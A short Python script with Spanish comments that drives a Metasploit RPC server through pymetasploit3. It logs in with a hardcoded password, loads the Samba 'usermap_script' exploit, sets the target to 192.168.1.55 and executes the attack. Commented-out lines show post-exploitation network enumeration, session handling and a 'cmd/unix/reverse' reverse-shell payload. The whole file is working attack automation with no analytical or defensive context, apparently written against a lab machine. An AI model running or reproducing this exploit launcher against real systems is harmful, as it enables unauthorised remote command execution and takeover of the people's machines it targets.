from pymetasploit3.msfrpc import *


# client = MsfRpcClient('backindoor')
client = MsfRpcClient('backindoor', port=55553, ssl=True)

# client.modules.post

# print(client.modules.post)

# module = client.modules.use('post', 'linux/gather/enum_network')

# Todas las opciones del modulo
# print(module.options)

# Opciones requeridas
# print(module.missing_required)
# Cambiar opcion
# module['SESSION'] = 1
# Opciones actuales
# print(module.runoptions)

# Crear consola
# console_id = client.consoles.console().cid
# Referencia a consola
# console = client.consoles.console(console_id)
# Ejecutar modulo
# print(console.run_module_with_output(module))

# Crear sesion
# session = client.sessions.session('1')
# print(session.gather_output())
# La sesion se crea como resultado de la ejecucion de un modulo que devuelva meterpreter

# print(module.execute())

# Sesiones activas
# print(client.sessions.list)


# print(client.modules.exploits)
module = client.modules.use('exploit', 'multi/samba/usermap_script')
# payload = client.modules.use('payload', 'cmd/unix/reverse')
# print(module.missing_required)
module['RHOSTS'] = '192.168.1.55'
# module['RPORT'] = '445'
# print(module.runoptions)
# print(module.options)
# print(module.optioninfo)
# Listar payloads disponibles
print(module.targetpayloads())
ss = module.execute()
print(ss)


# Crear consola
# console_id = client.consoles.console().cid
# Referencia a consola
# console = client.consoles.console(console_id)
# Ejecutar modulo
# print(console.run_module_with_output(module, payload='cmd/unix/reverse'))
# print(console.run_module_with_output(module))

# print(module.execute())
# print(client.sessions.list)